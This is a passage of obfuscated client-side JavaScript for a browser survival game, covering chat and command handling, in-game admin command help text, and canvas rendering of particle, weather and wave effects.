							for (var ⵠᐃ = ⲆΔⵠ; ⵠᐃ < ᐃᐃᐃⵠ.length; ⵠᐃ++) {
								var ᐃⲆⲆ = ᐃᐃᐃⵠ[ⵠᐃ];
								if (ᐃⲆⲆ.ⲆⵠⵠΔ === ᐃᐃΔ.id) {
									this.ΔⲆⵠⵠⵠ(ⵠ[307], 1, "Your position is " + Math.floor(ᐃⲆⲆ.x / ΔᐃⲆⲆⲆ) + ":" + Math.floor(ᐃⲆⲆ.y / 100));
									return true
								}
							}
							break;
						case "help-admin":
							this.ΔⲆⵠⵠⵠ("help-admin", 1, "List all available commands for admin only", this.ⵠⵠⵠⵠⵠ(["restart", "m | message", "mt | message-to", "w | welcome", ⵠ[163], "password", "k | kick", "b | ban", "tp | teleport", "tpa | teleport-all", "tpt | teleport-to", ⵠ[307], "heal", "cancel-craft", "da | disable-attack", "pvp | disable-pvp", "dgs | disable-gather-score", "drs | disable-resource", "dms | disable-mob-safety", "ds | disable-shop", "dn | disable-nickname", "dch | disable-chat", "dq | disable-quest", "dd | disable-drop", "ddc | disable-drop-crate", "db | disable-crate", "dwg | disable-warm-gauge", "dk | disable-kit", "dc | disable-craft", "dr | disable-recycling", "disable-clock", "disable-recipes-book", "disable-market", "sb | spawn-building", "fsb | force-spawn-building", "sch | spawn-chest", "spawn-area", "spawn-area-team", "cl | clean-position", "cba | clean-building-all", "ci | clean-inventory", "cia | clean-inventory-all", "harvest", "gs | give-score", "gsa | give-score-all", "rs | reset-score", "rk | reset-kill", "gm | godmode", "instant-craft", "ka | kill-animals", "g | give", "ga | give-to-all", "ri | remove-item", "ria | remove-item-all", "spawn-location", "tm | team-mode", "default-nickname", "mm | murder-mode", "br | battle-royale", "help-config", "gc | get-config", "sc | set-config", "reset-config", "save-config", "reset-event-time"]));
							return true;
							break;
						case "help":
							this.ΔⲆⵠⵠⵠ("help", 1, "List all available commands", this.ⵠⵠⵠⵠⵠ(["clean", "list", ⵠ[307], "help-admin", "help", "weapon-list", "tool-list", "survival-list", "resource-list", "food-list", "hat-list", "building-list", "biome-list"]));
							return true;
							break
					}
					return false
				},
				"ΔⵠᐃⲆⵠⲆᐃⲆᐃ": function() {
					if (!this[ΔᐃⲆⵠⲆⵠΔ[72]]) {
						this[ΔᐃⲆⵠⲆⵠΔ[72]] = ⲆΔΔⲆΔ;
						this.style.display = ⵠ[35];
						this.input.focus()
					}
				},
				"ΔΔΔⵠⲆᐃⵠ": function() {
					var ᐃⲆᐃⵠ = this.input.value;
					if (ᐃⲆᐃⵠ && ᐃⲆᐃⵠ.length > 0) {
						if (!this.ⵠⵠⵠᐃⵠⵠⵠ(ᐃⲆᐃⵠ)) ΔⵠⲆᐃ.ⲆᐃᐃᐃⲆⲆⲆᐃⵠ(this.input.value);
						this.input.value = ""
					}
				}
			};
			this.ⵠⵠⲆᐃᐃ = {
				open: false,
				input: document[ΔᐃⲆⵠⲆⵠΔ[68]]("chat_input"),
				style: document[ΔᐃⲆⵠⲆⵠΔ[68]]("chat_block").style,
				"ⵠⲆᐃ": function() {
					this.style.left = Math.floor(ΔΔΔᐃ / ⲆᐃᐃⲆ - 150) + ⵠ[39];
					this.style.top = Math.floor(ⵠⲆᐃⲆ / ⵠⵠⵠΔ + 80) + ⵠ[39]
				},
				"ⵠΔΔΔᐃ": function() {
					this[ΔᐃⲆⵠⲆⵠΔ[72]] = false;
					this.style.display = ⵠ[465];
					this.input.value = ""
				},
				prefix: "!",
				cmd: {
					hud: function(ᐃⵠᐃΔⲆΔΔ) {
						if (ᐃⵠᐃΔⲆΔΔ === "off") {
							var ᐃⲆᐃⵠ = 'Enter "!hud" without the quotes to restore the HUD';
							if (!ᐃᐃΔ.alert.text) ᐃᐃΔ.alert.text = ᐃⲆᐃⵠ;
							else ᐃᐃΔ.alert.list.push(ᐃⲆᐃⵠ);
							ΔⵠⵠⲆ.ᐃᐃΔⵠⵠⵠⲆ = 0
						} else ΔⵠⵠⲆ.ᐃᐃΔⵠⵠⵠⲆ = 1
					}
				},
				"ⵠⵠⵠᐃⵠⵠⵠ": function(ᐃⲆᐃⵠ) {
					if (ᐃⲆᐃⵠ.charAt(0) == this.prefix) {
						var cmd = "";
						var ᐃⵠᐃΔⲆΔΔ = "";
						for (var ⵠᐃ = 1; ⵠᐃ < ᐃⲆᐃⵠ.length && ᐃⲆᐃⵠ.charAt(ⵠᐃ) != " "; ⵠᐃ++) cmd += ᐃⲆᐃⵠ.charAt(ⵠᐃ);
						ⵠᐃ++;
						for (; ⵠᐃ < ᐃⲆᐃⵠ.length; ⵠᐃ++) ᐃⵠᐃΔⲆΔΔ += ᐃⲆᐃⵠ.charAt(ⵠᐃ);
						var ΔⲆⵠΔΔ = this.cmd[cmd];
						if (ΔⲆⵠΔΔ) ΔⲆⵠΔΔ(ᐃⵠᐃΔⲆΔΔ);
						return ΔᐃΔΔⵠ
					} else return false
				},
				"ⲆΔΔᐃⵠ": function() {
					if (!this[ΔᐃⲆⵠⲆⵠΔ[72]]) {
						this[ΔᐃⲆⵠⲆⵠΔ[72]] = true;
						this.style.display = ⵠ[35];
						this.input.focus()
					} else {
						this[ΔᐃⲆⵠⲆⵠΔ[72]] = ᐃᐃⵠΔⵠ;
						this.style.display = ⵠ[465];
						var ᐃⲆᐃⵠ = this.input.value;
						if (ᐃⲆᐃⵠ) {
							if (!this.ⵠⵠⵠᐃⵠⵠⵠ(ᐃⲆᐃⵠ)) ΔⵠⲆᐃ.ⲆΔΔΔΔⵠⵠⵠΔ(this.input.value);
							this.input.value = ""
						}
					}
				}
			};
			this.ΔⲆⵠΔᐃᐃⵠ = {
				"ᐃⲆΔΔⲆ": [],
				"ⵠⲆᐃ": function(ᐃΔᐃ) {
					ᐃΔᐃ.y += ᐃⵠᐃᐃ * 80 * ᐃΔᐃ.ᐃⵠⲆΔ;
					ᐃΔᐃ.x += ᐃⵠᐃᐃ * 80 * ᐃΔᐃ.c;
					ᐃΔᐃ.ᐃⵠΔᐃⵠ -= ᐃⵠᐃᐃ / 6;
					if (ᐃΔᐃ.ᐃⵠΔᐃⵠ > .2) ᐃΔᐃ.alpha = Math.min(ᐃΔᐃ.alpha + ᐃⵠᐃᐃ * ΔⲆᐃⲆ, 1);
					else ᐃΔᐃ.alpha = Math.max(ᐃΔᐃ.alpha - ᐃⵠᐃᐃ * ᐃΔᐃⲆ, 0)
				},
				add: function(ⵠΔΔᐃ) {
					var length = Math.floor(Math.min(Ⲇ.ΔⲆΔⵠⲆⵠΔ * (ΔΔΔᐃ / 1366), Ⲇ.ΔⲆΔⵠⲆⵠΔ + 10) * Math.max(Math.min(ⲆⲆⲆ.ΔⵠΔΔⵠ + 1e3, 3e3) / 3e3, 0));
					if (this.ᐃⲆΔΔⲆ.length < length) {
						var ᐃΔ = Math.floor(Math.random() * Ⲇ.ⲆΔΔᐃᐃΔⲆ);
						var Δⵠ = -ᐃᐃΔ.ⲆΔΔ.x + Math.floor(Math.random() * ᐃᐃΔ.ⲆΔΔ.w);
						var ⲆⵠⲆ = -ᐃᐃΔ.ⲆΔΔ.y + Math.floor(Math.random() * ᐃᐃΔ.ⲆΔΔ.ⵠⵠᐃ);
						var ⲆᐃΔ = Math.random(Math.PI);
						this.ᐃⲆΔΔⲆ.push(new ⵠⲆⲆᐃᐃΔᐃ(ᐃΔ, Δⵠ, ⲆⵠⲆ, ⲆᐃΔ))
					}
				}
			};
			this.Δⵠⵠⵠⵠᐃᐃ = ⵠⲆᐃⵠ;
			this.ᐃΔⵠⲆᐃ = ΔⲆⲆ;
			this.ⵠⲆΔᐃⵠ = {
				"ᐃⲆΔΔⲆ": [],
				"ⲆⵠᐃᐃΔ": ΔΔⵠⵠ,
				"ⵠⲆΔⵠⲆ": ΔΔⵠⵠ,
				"ⵠⲆᐃ": function(ᐃΔᐃ) {
					ᐃΔᐃ.y += ᐃⵠᐃᐃ * (200 + 800 * this.ⵠⲆΔⵠⲆ) * ᐃΔᐃ.ᐃⵠⲆΔ;
					ᐃΔᐃ.x += ᐃⵠᐃᐃ * (200 + 800 * this.ⵠⲆΔⵠⲆ) * ᐃΔᐃ.c;
					ᐃΔᐃ.ᐃⵠΔᐃⵠ -= ᐃⵠᐃᐃ / ⲆᐃⲆᐃ;
					if (ᐃΔᐃ.ᐃⵠΔᐃⵠ > .2) ᐃΔᐃ.alpha = Math.min(ᐃΔᐃ.alpha + ᐃⵠᐃᐃ * ΔⲆΔᐃ, ⵠᐃⵠΔ);
					else ᐃΔᐃ.alpha = Math.max(ᐃΔᐃ.alpha - ᐃⵠᐃᐃ * ⲆⵠⲆⲆ, ⲆΔⵠ)
				},
				add: function(ⵠΔΔᐃ) {
					var length = Math.floor(Math.min((this.ⵠⲆΔⵠⲆ + .1) * Ⲇ.ΔᐃᐃΔᐃᐃᐃ * (ΔΔΔᐃ / 1366), (this.ⵠⲆΔⵠⲆ + .1) * Ⲇ.ΔᐃᐃΔᐃᐃᐃ + 10) * Math.max(Math.min(ⲆⲆⲆ.ᐃᐃⲆΔⲆ + 1e3, 3e3) / 3e3, 0));
					if (this.ᐃⲆΔΔⲆ.length < length) {
						var ᐃΔ = Math.floor(Math.random() * Ⲇ.ⲆΔΔᐃᐃΔⲆ);
						var Δⵠ = -ᐃᐃΔ.ⲆΔΔ.x + Math.floor(Math.random() * ᐃᐃΔ.ⲆΔΔ.w);
						var ⲆⵠⲆ = -ᐃᐃΔ.ⲆΔΔ.y + Math.floor(Math.random() * ᐃᐃΔ.ⲆΔΔ.ⵠⵠᐃ);
						var ⲆᐃΔ = Math.random(Math.PI);
						if (ᐃᐃΔ.ⵠⲆΔᐃⵠ.ⲆⵠᐃᐃΔ !== 0) Δⵠ -= ᐃᐃΔ.ⲆΔΔ.w / 2;
						this.ᐃⲆΔΔⲆ.push(new ⵠⲆⲆᐃᐃΔᐃ(ᐃΔ, Δⵠ, ⲆⵠⲆ, ⲆᐃΔ))
					}
				}
			};
			this.ⲆᐃΔⲆΔ = {
				"ᐃⲆΔΔⲆ": [],
				"ⲆⵠᐃᐃΔ": ᐃⵠⲆⵠ,
				"ⵠⲆΔⵠⲆ": Ⲇᐃᐃᐃ,
				"ⵠⲆᐃ": function(ᐃΔᐃ) {
					if (ΔⵠⵠΔΔ.ⵠⲆⵠⲆΔᐃᐃ()) ᐃΔᐃ.y += ᐃⵠᐃᐃ * ᐃΔᐃ.ᐃᐃΔᐃᐃ * (5.5 + ᐃⵠᐃΔⵠ * this.ⵠⲆΔⵠⲆ);
					else ᐃΔᐃ.y += ᐃⵠᐃᐃ * ᐃΔᐃ.ᐃᐃΔᐃᐃ * (ⵠⵠᐃⵠ + 10 * this.ⵠⲆΔⵠⲆ);
					ᐃΔᐃ.ᐃⵠΔᐃⵠ -= ᐃⵠᐃᐃ / Ⲇⵠⵠᐃ;
					if (ΔⵠⵠΔΔ.ⵠⲆΔᐃⲆⲆΔ()) ᐃΔᐃ.x += ᐃⵠᐃᐃ * (ΔΔⲆⵠΔⲆⵠ + 400 * this.ⵠⲆΔⵠⲆ);
					else if (ΔⵠⵠΔΔ.ᐃⲆⵠᐃⵠᐃⲆ()) ᐃΔᐃ.x -= ᐃⵠᐃᐃ * (130 - 400 * this.ⵠⲆΔⵠⲆ);
					else ᐃΔᐃ.x -= ᐃⵠᐃᐃ * (30 - 400 * this.ⵠⲆΔⵠⲆ);
					if (ᐃΔᐃ.ᐃⵠΔᐃⵠ > .2) ᐃΔᐃ.alpha = Math.min(ᐃΔᐃ.alpha + ᐃⵠᐃᐃ * ᐃᐃⲆⲆ, ⵠΔᐃ);
					else ᐃΔᐃ.alpha = Math.max(ᐃΔᐃ.alpha - ᐃⵠᐃᐃ * 5, 0)
				},
				add: function(ⵠΔΔᐃ) {
					var length = Math.floor(Math.min((this.ⵠⲆΔⵠⲆ * 1.5 + .5) * Ⲇ.ⵠΔⵠⵠⲆⵠⲆ * (ΔΔΔᐃ / 1366), (this.ⵠⲆΔⵠⲆ * 1.5 + .5) * Ⲇ.ⵠΔⵠⵠⲆⵠⲆ + ⲆⵠΔΔᐃ) * Math.max(Math.min(ⲆⲆⲆ.ⵠΔΔⲆΔ + 1e3, 3e3) / 3e3, 0));
					if (this.ᐃⲆΔΔⲆ.length < length) {
						var ᐃΔ = Math.floor(Math.random() * Ⲇ.ᐃⲆⵠⲆⲆΔᐃ);
						var Δⵠ = -ᐃᐃΔ.ⲆΔΔ.x + Math.floor(Math.random() * ᐃᐃΔ.ⲆΔΔ.w);
						var ⲆⵠⲆ = -ᐃᐃΔ.ⲆΔΔ.y + Math.floor(Math.random() * 400 * ᐃ - 200 * ᐃ);
						this.ᐃⲆΔΔⲆ.push(new ⵠⲆⲆᐃᐃΔᐃ(ᐃΔ, Δⵠ, ⲆⵠⲆ, 0))
					}
				}
			};

			function ᐃΔᐃⲆΔⵠᐃᐃᐃ() {
				this.seed = 1;
				this.ΔᐃⲆΔΔᐃⲆ = ᐃⲆΔⲆ;
				this.ᐃΔⵠⲆᐃᐃᐃ = ΔΔᐃΔ;
				this.ⲆᐃᐃⵠΔᐃⵠⵠⲆ = ⵠᐃⵠΔ;
				this.ⵠᐃⲆᐃⲆⲆⲆⲆᐃ = 2;
				this.ⵠᐃⲆᐃΔᐃᐃᐃⵠ = 3;
				this.ΔⲆᐃΔΔⵠΔ = function(Δⵠ) {
					this.seed = 2 + Math.floor(ΔᐃᐃΔ.ⵠΔⵠᐃΔ * Math.random())
				};
				this.ᐃⵠᐃⵠⲆΔⵠ = function(Δⵠ) {
					this.ΔᐃⲆΔΔᐃⲆ = Ⲇᐃᐃⵠ + Math.floor(ΔᐃᐃΔ.ⵠΔⵠᐃΔ * Math.random())
				};
				this.ⵠⵠΔᐃⵠΔᐃ = function(Δⵠ) {
					this.ᐃΔⵠⲆᐃᐃᐃ = 2 + Math.floor(Math.random() * ΔᐃᐃΔ.ⵠΔⵠᐃΔ)
				};
				this.ᐃΔⲆⵠⲆⵠⲆᐃᐃ = function(Δⵠ) {
					this.ⲆᐃᐃⵠΔᐃⵠⵠⲆ = ⵠⵠⵠΔ + Math.floor(ΔᐃᐃΔ.ⵠΔⵠᐃΔ * Math.random())
				};
				this.ΔⵠⵠⵠᐃΔⲆᐃⲆ = function(Δⵠ) {
					this.ⵠᐃⲆᐃⲆⲆⲆⲆᐃ = Δⵠⵠⵠ + Math.floor(Math.random() * ΔᐃᐃΔ.ⵠΔⵠᐃΔ)
				};
				this.ΔⵠᐃⲆⵠⵠⲆⲆⲆ = function(Δⵠ) {
					this.ⵠᐃⲆᐃΔᐃᐃᐃⵠ = ᐃⲆⵠᐃ + Math.floor(Math.random() * ΔᐃᐃΔ.ⵠΔⵠᐃΔ)
				};
				this.ⵠΔⲆᐃⲆᐃⵠ = function(ⲆⵠⲆ, ᐃⲆⲆ, ΔⵠⲆᐃⵠ, ⲆΔⵠⲆΔⲆⲆ, ⲆⵠΔΔΔⵠᐃ, ⵠΔⵠΔⵠ, ⲆⵠΔΔⲆ) {
					for (var ⵠᐃ = Ⲇᐃⵠ; ⵠᐃ < ⲆⵠΔΔⲆ;) {
						var ᐃⵠᐃⵠ = ⵠᐃ * ΔⵠⲆᐃⵠ % ᐃⵠⵠⲆⲆⲆΔ;
						var ΔᐃΔ = ⲆᐃⵠⲆⵠⵠⲆ[ᐃⵠᐃⵠ];
						if (.1 > ΔᐃΔ) {
							ⲆⲆⵠ += 50;
							ⵠᐃ += 50;
							continue
						}
						var ⲆⲆⵠ = Math.floor(ⲆΔⵠⲆΔⲆⲆ * ΔᐃΔ + ⲆⵠΔΔΔⵠᐃ);
						if (ⵠΔⵠΔⵠ < ⵠᐃ && ⲆⵠΔΔⲆ > ⵠᐃ) {
							var ᐃⵠⲆΔ = Math.random() > .5 ? -ᐃⵠΔⵠⵠ * ᐃⵠᐃᐃ : ᐃⵠᐃᐃ * ⵠⵠΔⲆᐃ;
							var ᐃᐃⲆⲆⲆ = ⲆⲆⵠ * ᐃⲆⲆ;
							this.ΔⲆⲆΔΔΔᐃ[ᐃⵠᐃⵠ] = Math.max(-ΔᐃᐃΔ.ᐃⵠΔᐃᐃᐃⲆ, Math.min(ΔᐃᐃΔ.ᐃⵠΔᐃᐃᐃⲆ, this.ΔⲆⲆΔΔΔᐃ[ᐃⵠᐃⵠ] + ᐃⵠⲆΔ));
							this.ᐃⲆⵠᐃᐃΔΔ[ᐃⵠᐃⵠ] = Math.max(-ΔᐃᐃΔ.ᐃΔᐃⵠΔⵠⲆ, Math.min(ΔᐃᐃΔ.ᐃΔᐃⵠΔⵠⲆ, this.ᐃⲆⵠᐃᐃΔΔ[ᐃⵠᐃⵠ] + ᐃⵠⲆΔ));
							if (ᐃᐃⲆⲆⲆ > 0) {
								Δ.beginPath();
								Δ.arc(ⵠᐃ + ᐃᐃΔ.ⲆΔΔ.x + this.ᐃⲆⵠᐃᐃΔΔ[ᐃⵠᐃⵠ], ⲆⵠⲆ + this.ΔⲆⲆΔΔΔᐃ[ᐃⵠᐃⵠ] - .8 * ΔᐃᐃΔ.ᐃⵠΔᐃᐃᐃⲆ, ᐃᐃⲆⲆⲆ, 0, ᐃⲆΔⲆ * Math.PI);
								if (ⲆⲆⲆ.transition) {
									var ᐃΔΔⵠ = ⲆⲆⲆ.time ? 1 - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
									Δ.fillStyle = ⲆΔⲆⲆⲆ(83, 156, 160, 236, 247, 249, ᐃΔΔⵠ)
								} else Δ.fillStyle = Ⲇ.ⵠΔᐃᐃᐃᐃΔ[ⲆⲆⲆ.time];
								Δ.fill()
							}
						}
						ⵠᐃ += ⲆⲆⵠ * ⲆΔΔⵠ
					}
				};
				this.ⵠⲆᐃᐃⲆⵠΔ = function(Δⵠ, ᐃⲆⲆ, ΔⵠⲆᐃⵠ, ⲆΔⵠⲆΔⲆⲆ, ⲆⵠΔΔΔⵠᐃ, ⵠⵠΔⲆΔ, ΔⲆⲆᐃΔ) {
					for (var ⵠᐃ = 1; ΔⲆⲆᐃΔ > ⵠᐃ;) {
						var ᐃⵠᐃⵠ = ⵠᐃ * ΔⵠⲆᐃⵠ % ᐃⵠⵠⲆⲆⲆΔ;
						var ΔᐃΔ = ⲆᐃⵠⲆⵠⵠⲆ[ᐃⵠᐃⵠ];
						if (.1 > ΔᐃΔ) {
							ⲆⲆⵠ += 50;
							ⵠᐃ += 50;
							continue
						}
						var ⲆⲆⵠ = Math.floor(ΔᐃΔ * ⲆΔⵠⲆΔⲆⲆ + ⲆⵠΔΔΔⵠᐃ);
						if (ⵠⵠΔⲆΔ < ⵠᐃ && ΔⲆⲆᐃΔ > ⵠᐃ) {
							var ᐃⵠⲆΔ = Math.random() > .5 ? -10 * ᐃⵠᐃᐃ : ᐃⵠᐃᐃ * ᐃΔⲆᐃⵠ;
							var ᐃᐃⲆⲆⲆ = ⲆⲆⵠ * ᐃⲆⲆ;
							this.ⲆⲆⵠⵠⵠ[ᐃⵠᐃⵠ] = Math.max(-ΔᐃᐃΔ.ᐃⵠΔᐃᐃᐃⲆ, Math.min(ΔᐃᐃΔ.ᐃⵠΔᐃᐃᐃⲆ, this.ⲆⲆⵠⵠⵠ[ᐃⵠᐃⵠ] + ᐃⵠⲆΔ));
							this.ⵠᐃᐃⲆⵠ[ᐃⵠᐃⵠ] = Math.max(-ΔᐃᐃΔ.ᐃΔᐃⵠΔⵠⲆ, Math.min(ΔᐃᐃΔ.ᐃΔᐃⵠΔⵠⲆ, this.ⵠᐃᐃⲆⵠ[ᐃⵠᐃⵠ] + ᐃⵠⲆΔ));
							if (ᐃᐃⲆⲆⲆ > 0) {
								Δ.beginPath();
								Δ.arc(Δⵠ + this.ⲆⲆⵠⵠⵠ[ᐃⵠᐃⵠ] - .8 * ΔᐃᐃΔ.ᐃⵠΔᐃᐃᐃⲆ, ⵠᐃ + ᐃᐃΔ.ⲆΔΔ.y + this.ⵠᐃᐃⲆⵠ[ᐃⵠᐃⵠ], ᐃᐃⲆⲆⲆ, 0, Math.PI * Ⲇᐃᐃⵠ);
								if (ⲆⲆⲆ.transition) {
									var ᐃΔΔⵠ = ⲆⲆⲆ.time ? ΔΔΔ - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
									Δ.fillStyle = ⲆΔⲆⲆⲆ(83, 156, 160, 236, 247, 249, ᐃΔΔⵠ)
								} else Δ.fillStyle = Ⲇ.ⵠΔᐃᐃᐃᐃΔ[ⲆⲆⲆ.time];
								Δ.fill()
							}
						}
						ⵠᐃ += ⲆⲆⵠ * 2
					}
				};
				this.ⲆⵠⵠΔⵠᐃᐃᐃⵠ = function(ⲆⵠⲆ, ΔᐃⵠⲆ, ⵠⵠⵠᐃⵠΔⵠ, ⵠⲆⲆⲆ, ⵠΔⵠΔⵠ, ⲆⵠΔΔⲆ) {
					ⵠΔⵠΔⵠ -= 30;
					ⲆⵠΔΔⲆ += 30;
					var ᐃⲆⲆ = -((ⵠⵠⵠᐃⵠΔⵠ - ΔᐃᐃΔ.ᐃⲆᐃΔΔ - ⵠⲆⲆⲆ - 2) / ΔᐃᐃΔ.ΔⲆⵠᐃⵠⲆⲆ);
					ⵠⲆⲆ === ᐃⲆⲆ && this.ⵠⵠΔᐃⵠΔᐃ();
					Δ.globalAlpha = ΔΔⲆᐃ.ⲆΔⵠⵠᐃ(ᐃⲆⲆ);
					this.ⵠΔⲆᐃⲆᐃⵠ(ⵠⵠⵠᐃⵠΔⵠ, ᐃⲆⲆ, this.ᐃΔⵠⲆᐃᐃᐃ, ⲆⲆⵠᐃⲆⵠⲆ, ΔᐃᐃΔⵠ, ⵠΔⵠΔⵠ, ⲆⵠΔΔⲆ);
					Δ.globalAlpha = ΔⲆⵠ;
					var ᐃⲆⲆ = -((ⲆⵠⲆ - ΔᐃᐃΔ.ⵠⵠᐃⲆΔ - ⵠⲆⲆⲆ + 500) / ΔᐃᐃΔ.ᐃᐃΔΔⲆⲆᐃ);
					ᐃⲆⲆ === 0 && this.ΔⲆᐃΔΔⵠΔ();
					Δ.globalAlpha = ΔΔⲆᐃ.ⲆΔⵠⵠᐃ(ᐃⲆⲆ);
					this.ⵠΔⲆᐃⲆᐃⵠ(ⲆⵠⲆ, ᐃⲆⲆ, this.seed, ᐃⲆⲆΔⵠ, ᐃΔⲆᐃⵠ, ⵠΔⵠΔⵠ, ⲆⵠΔΔⲆ);
					Δ.globalAlpha = ΔΔΔ;
					if (-1 === ΔᐃⵠⲆ) return;
					var ᐃⲆⲆ = -((ΔᐃⵠⲆ - ΔᐃᐃΔ.Ⲇⵠⵠᐃⵠ - ⵠⲆⲆⲆ + 698) / ΔᐃᐃΔ.ᐃΔⲆⵠⵠⵠⵠ);
					if (.01 >= ᐃⲆⲆ) this.ᐃⵠᐃⵠⲆΔⵠ();
					Δ.globalAlpha = ΔΔⲆᐃ.ⲆΔⵠⵠᐃ(ᐃⲆⲆ);
					this.ⵠΔⲆᐃⲆᐃⵠ(ΔᐃⵠⲆ, ᐃⲆⲆ, this.ΔᐃⲆΔΔᐃⲆ, ⵠⵠⵠⲆⲆ, ΔᐃⲆᐃ, ⵠΔⵠΔⵠ, ⲆⵠΔΔⲆ);
					Δ.globalAlpha = 1
				};
				this.ⵠⲆΔⲆⲆᐃⵠᐃΔ = function(ⲆⵠⲆ, ΔᐃⵠⲆ, ⵠⵠⵠᐃⵠΔⵠ, ⵠⲆⲆⲆ, ⵠΔⵠΔⵠ, ⲆⵠΔΔⲆ) {
					ⵠΔⵠΔⵠ -= 30;
					ⲆⵠΔΔⲆ += 30;
					var ᐃⲆⲆ = -((-ⵠⵠⵠᐃⵠΔⵠ + ΔᐃᐃΔ.ᐃⲆᐃΔΔ + ⵠⲆⲆⲆ + ᐃⲆΔⲆ) / ΔᐃᐃΔ.ΔⲆⵠᐃⵠⲆⲆ);
					0 === ᐃⲆⲆ && this.ⵠⵠΔᐃⵠΔᐃ();
					Δ.globalAlpha = ΔΔⲆᐃ.ⲆΔⵠⵠᐃ(ᐃⲆⲆ);
					this.ⵠΔⲆᐃⲆᐃⵠ(ⵠⵠⵠᐃⵠΔⵠ, ᐃⲆⲆ, this.ᐃΔⵠⲆᐃᐃᐃ, ᐃᐃᐃᐃⲆ, ΔΔᐃᐃΔ, ⵠΔⵠΔⵠ, ⲆⵠΔΔⲆ);
					Δ.globalAlpha = ⵠΔΔ;
					var ᐃⲆⲆ = -((-ⲆⵠⲆ + ΔᐃᐃΔ.ⵠⵠᐃⲆΔ + ⵠⲆⲆⲆ) / ΔᐃᐃΔ.ᐃᐃΔΔⲆⲆᐃ);
					ᐃⲆⲆ === ⲆⲆⲆᐃ && this.ΔⲆᐃΔΔⵠΔ();
					Δ.globalAlpha = ΔΔⲆᐃ.ⲆΔⵠⵠᐃ(ᐃⲆⲆ);
					this.ⵠΔⲆᐃⲆᐃⵠ(ⲆⵠⲆ, ᐃⲆⲆ, this.seed, ᐃⲆⲆΔⵠ, 10, ⵠΔⵠΔⵠ, ⲆⵠΔΔⲆ);
					Δ.globalAlpha = 1;
					if (-ΔⵠΔⵠ === ΔᐃⵠⲆ) return;
					var ᐃⲆⲆ = -((-ΔᐃⵠⲆ + ΔᐃᐃΔ.Ⲇⵠⵠᐃⵠ + ⵠⲆⲆⲆ) / ΔᐃᐃΔ.ᐃΔⲆⵠⵠⵠⵠ);
					if (ᐃⲆⲆ <= .01) this.ᐃⵠᐃⵠⲆΔⵠ();
					Δ.globalAlpha = ΔΔⲆᐃ.ⲆΔⵠⵠᐃ(ᐃⲆⲆ);
					this.ⵠΔⲆᐃⲆᐃⵠ(ΔᐃⵠⲆ, ᐃⲆⲆ, this.ΔᐃⲆΔΔᐃⲆ, ⵠⵠⵠⲆⲆ, 6, ⵠΔⵠΔⵠ, ⲆⵠΔΔⲆ);
					Δ.globalAlpha = ᐃΔᐃⲆ
				};
				this.ᐃⲆᐃⲆΔᐃᐃⲆΔ = function(Δⵠ, ⵠⵠΔᐃ, ᐃᐃΔⵠⵠⲆⵠ, ⵠⲆⲆΔ, ⵠⵠΔⲆΔ, ΔⲆⲆᐃΔ) {
					ⵠⵠΔⲆΔ -= 30;
					ΔⲆⲆᐃΔ += 30;
					var ᐃⲆⲆ = -((-ᐃᐃΔⵠⵠⲆⵠ + ΔᐃᐃΔ.ᐃⲆᐃΔΔ + ⵠⲆⲆΔ + ⵠⵠΔⲆ) / ΔᐃᐃΔ.ΔⲆⵠᐃⵠⲆⲆ);
					if (ᐃⲆⲆ === Δᐃᐃⵠ) this.ⵠⵠΔᐃⵠΔᐃ();
					Δ.globalAlpha = ΔΔⲆᐃ.ⲆΔⵠⵠᐃ(ᐃⲆⲆ);
					this.ⵠⲆᐃᐃⲆⵠΔ(ᐃᐃΔⵠⵠⲆⵠ, ᐃⲆⲆ, this.ᐃΔⵠⲆᐃᐃᐃ, 18, ⲆⲆⲆΔΔ, ⵠⵠΔⲆΔ, ΔⲆⲆᐃΔ);
					Δ.globalAlpha = ΔᐃᐃⲆ;
					var ᐃⲆⲆ = -((-Δⵠ + ΔᐃᐃΔ.ⵠⵠᐃⲆΔ + ⵠⲆⲆΔ) / ΔᐃᐃΔ.ᐃᐃΔΔⲆⲆᐃ);
					if (ᐃⲆⲆ === 0) this.ΔⲆᐃΔΔⵠΔ();
					Δ.globalAlpha = ΔΔⲆᐃ.ⲆΔⵠⵠᐃ(ᐃⲆⲆ);
					this.ⵠⲆᐃᐃⲆⵠΔ(Δⵠ, ᐃⲆⲆ, this.seed, 12, ⲆⵠΔΔᐃ, ⵠⵠΔⲆΔ, ΔⲆⲆᐃΔ);
					Δ.globalAlpha = 1;
					if (-1 === ⵠⵠΔᐃ) return;
					var ᐃⲆⲆ = -((-ⵠⵠΔᐃ + ΔᐃᐃΔ.Ⲇⵠⵠᐃⵠ + ⵠⲆⲆΔ) / ΔᐃᐃΔ.ᐃΔⲆⵠⵠⵠⵠ);
					ᐃⲆⲆ <= .01 && this.ᐃⵠᐃⵠⲆΔⵠ();
					Δ.globalAlpha = ΔΔⲆᐃ.ⲆΔⵠⵠᐃ(ᐃⲆⲆ);
					this.ⵠⲆᐃᐃⲆⵠΔ(ⵠⵠΔᐃ, ᐃⲆⲆ, this.ΔᐃⲆΔΔᐃⲆ, 6, ᐃⵠⲆⵠΔ, ⵠⵠΔⲆΔ, ΔⲆⲆᐃΔ);
					Δ.globalAlpha = 1
				};
				this.ᐃᐃᐃΔⲆΔⵠᐃᐃ = function(Δⵠ, ⵠⵠΔᐃ, ᐃᐃΔⵠⵠⲆⵠ, ⵠⲆⲆΔ, ⵠⵠΔⲆΔ, ΔⲆⲆᐃΔ) {
					ⵠⵠΔⲆΔ -= 30;
					ΔⲆⲆᐃΔ += 30;
					var ᐃⲆⲆ = -((ᐃᐃΔⵠⵠⲆⵠ - ΔᐃᐃΔ.ᐃⲆᐃΔΔ - ⵠⲆⲆΔ - 2) / ΔᐃᐃΔ.ΔⲆⵠᐃⵠⲆⲆ);
					if (ᐃⵠⲆⵠ === ᐃⲆⲆ) this.ⵠⵠΔᐃⵠΔᐃ();
					Δ.globalAlpha = ΔΔⲆᐃ.ⲆΔⵠⵠᐃ(ᐃⲆⲆ);
					this.ⵠⲆᐃᐃⲆⵠΔ(ᐃᐃΔⵠⵠⲆⵠ, ᐃⲆⲆ, this.ᐃΔⵠⲆᐃᐃᐃ, ⲆⲆᐃⲆΔᐃΔ, ⵠΔⲆᐃᐃ, ⵠⵠΔⲆΔ, ΔⲆⲆᐃΔ);
					Δ.globalAlpha = ᐃᐃⵠ;
